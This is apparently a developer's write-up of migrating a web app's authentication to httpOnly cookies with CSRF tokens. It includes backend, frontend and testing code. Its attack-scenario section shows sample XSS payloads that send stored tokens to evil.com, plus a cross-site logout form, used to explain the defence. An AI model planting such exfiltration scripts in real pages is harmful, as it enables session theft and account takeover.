# Security Improvements: XSS Protection via httpOnly Cookies

## Overview
Migrated authentication system from localStorage-based JWT storage to httpOnly cookies with CSRF protection to eliminate XSS vulnerabilities.

## Changes Made

### 1. Backend Changes (`backend/app/auth.py`)

#### Added Cookie Management
```python
COOKIE_NAME = "auth_token"
COOKIE_MAX_AGE = 60 * 60 * 24 * 7  # 7 days

def set_auth_cookie(response: Response, token: str) -> None:
    """Set httpOnly authentication cookie"""
    response.set_cookie(
        key=COOKIE_NAME,
        value=token,
        max_age=COOKIE_MAX_AGE,
        httponly=True,   # ✅ Prevents JavaScript access (XSS protection)
        secure=False,     # Set to True in production with HTTPS
        samesite="lax",   # ✅ CSRF protection
        path="/",
    )
```

#### Added CSRF Token Management
```python
def generate_csrf_token() -> str:
    """Generate a new CSRF token"""
    return secrets.token_hex(32)

def validate_csrf_token(token: str, user_id: int) -> bool:
    """Validate CSRF token"""
    return csrf_tokens.get(token) == user_id
```

#### Updated Authentication Dependency
- Now reads JWT from cookies instead of Authorization header
- Falls back to Authorization header for backward compatibility
```python
async def get_current_user(request: Request) -> dict:
    # Try to get token from cookie first
    token = get_token_from_cookie(request)
    
    # Fallback to Authorization header
    if not token:
        auth_header = request.headers.get("Authorization")
        # ...
```

### 2. Backend Routes (`backend/app/main.py`)

#### Register Endpoint (`POST /auth/register`)
**Before:**
```python
return {"access_token": access_token, "token_type": "bearer"}
```

**After:**
```python
set_auth_cookie(response, access_token)
csrf_token = generate_csrf_token()
store_csrf_token(csrf_token, user_id)

return {
    "message": "Registration successful",
    "user": {"id": user_id, "email": user.email},
    "csrf_token": csrf_token,  # ✅ Client receives CSRF token
}
```

#### Login Endpoint (`POST /auth/login`)
- Same changes as register endpoint
- Sets httpOnly cookie with JWT
- Returns CSRF token in response body

#### New Endpoints Added
1. **`GET /auth/csrf-token`** - Get/refresh CSRF token for authenticated users
2. **`POST /auth/logout`** - Clear httpOnly cookie and invalidate session
3. **`POST /auth/refresh`** - Refresh JWT token and get new CSRF token

### 3. Frontend Changes (`src/lib/auth.ts`)

#### Axios Configuration
```typescript
const api = axios.create({
  baseURL: API_BASE_URL,
  withCredentials: true,  // ✅ Enable sending cookies with requests
});
```

#### CSRF Token Management
```typescript
let csrfToken: string | null = null;

// Fetch CSRF token on login/register
export const initCSRF = async () => {
  const response = await api.get('/auth/csrf-token');
  csrfToken = response.data.csrf_token;
};

// Add CSRF token to state-changing requests
api.interceptors.request.use((config) => {
  if (['post', 'put', 'delete', 'patch'].includes(config.method)) {
    if (csrfToken) {
      config.headers['X-CSRF-Token'] = csrfToken;
    }
  }
  return config;
});
```

#### Auth API Updates
**Before:**
```typescript
login: async (email: string, password: string) => {
  const response = await api.post('/auth/login', { email, password });
  localStorage.setItem('auth_token', data.access_token);  // ❌ XSS vulnerable
  return response.data;
}
```

**After:**
```typescript
login: async (email: string, password: string) => {
  const response = await api.post('/auth/login', { email, password });
  if (response.data.csrf_token) {
    csrfToken = response.data.csrf_token;  // ✅ Store CSRF in memory
  }
  // ✅ JWT is in httpOnly cookie, not accessible to JavaScript
  return response.data;
}
```

### 4. Component Updates

#### LoginForm.tsx & SignupForm.tsx
**Removed:**
```typescript
localStorage.setItem('auth_token', data.access_token);  // ❌ XSS vulnerable
```

**Now:**
- No localStorage operations
- Server automatically sets httpOnly cookie
- Components just call API and handle success/error

## Security Benefits

### 1. XSS Protection (Primary Goal)
- ✅ **JWT tokens no longer accessible via JavaScript** (`document.cookie` returns nothing for httpOnly cookies)
- ✅ **Malicious scripts cannot steal authentication tokens**
- ✅ **Even if XSS vulnerability exists, attacker cannot exfiltrate session**

### 2. CSRF Protection
- ✅ **SameSite=Lax cookie attribute** prevents cross-site request forgery
- ✅ **Double-submit CSRF token pattern** for sensitive operations
- ✅ **State-changing requests require valid CSRF token in header**

### 3. Defense in Depth
- ✅ **Separate authentication (cookie) and CSRF (header) validation**
- ✅ **CSRF tokens stored in memory, not localStorage/sessionStorage**
- ✅ **Token rotation on refresh**

## Attack Scenarios Mitigated

### Scenario 1: XSS Attack
**Before:**
```javascript
// Attacker injects malicious script
<script>
  fetch('https://evil.com/steal?token=' + localStorage.getItem('auth_token'));
</script>
// ❌ Token stolen, attacker can impersonate user
```

**After:**
```javascript
// Attacker injects malicious script
<script>
  fetch('https://evil.com/steal?token=' + document.cookie);
</script>
// ✅ Returns empty string, httpOnly cookies not accessible
// ✅ Token cannot be stolen, attack fails
```

### Scenario 2: CSRF Attack
**Before:**
```html
<!-- Attacker's malicious site -->
<form action="http://localhost:8000/auth/logout" method="POST">
  <input type="submit" value="Click here for free prize!">
</form>
<!-- User clicks, gets logged out because cookies auto-sent -->
```

**After:**
```html
<!-- Same malicious form -->
<!-- ✅ Request blocked by SameSite=Lax -->
<!-- ✅ Or fails CSRF token validation if somehow sent -->
```

## Production Checklist

Before deploying to production, ensure:

1. **Enable HTTPS**
   ```python
   # backend/app/auth.py
   secure=True,  # Change from False
   ```

2. **Use Redis for CSRF tokens**
   ```python
   # Replace in-memory dict with Redis
   import redis
   redis_client = redis.Redis(host='localhost', port=6379, db=0)
   ```

3. **Set strong SECRET_KEY**
   ```bash
   # Generate secure key
   python -c "import secrets; print(secrets.token_hex(32))"
   ```

4. **Configure CORS properly**
   ```python
   allow_origins=["https://yourdomain.com"],  # Only production domain
   ```

5. **Add rate limiting** for auth endpoints
6. **Enable HSTS headers** in production
7. **Regular security audits** and dependency updates

## Testing

### Manual Test Flow
1. Open browser DevTools → Application → Cookies
2. Register/Login → Verify `auth_token` cookie exists with:
   - ✅ HttpOnly flag
   - ✅ SameSite=Lax
   - ✅ Path=/
3. Try `document.cookie` in console → Verify auth_token NOT visible
4. Make API request to `/auth/me` → Verify authenticated
5. Logout → Verify cookie cleared

### API Endpoints
```bash
# Register
curl -X POST http://localhost:8000/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"test123"}' \
  -c cookies.txt

# Get user info (uses cookie)
curl http://localhost:8000/auth/me -b cookies.txt

# Logout (requires CSRF)
curl -X POST http://localhost:8000/auth/logout \
  -b cookies.txt \
  -H "X-CSRF-Token: <token-from-login-response>"
```

## Migration Notes

- ✅ **No breaking changes for users** - Existing sessions will expire, requiring re-login
- ✅ **Backward compatible** - Still accepts Authorization header for transition period
- ✅ **Zero localStorage usage** - All token storage eliminated

## References

- [OWASP: HttpOnly Cookie](https://owasp.org/www-community/HttpOnly)
- [OWASP: CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP: XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
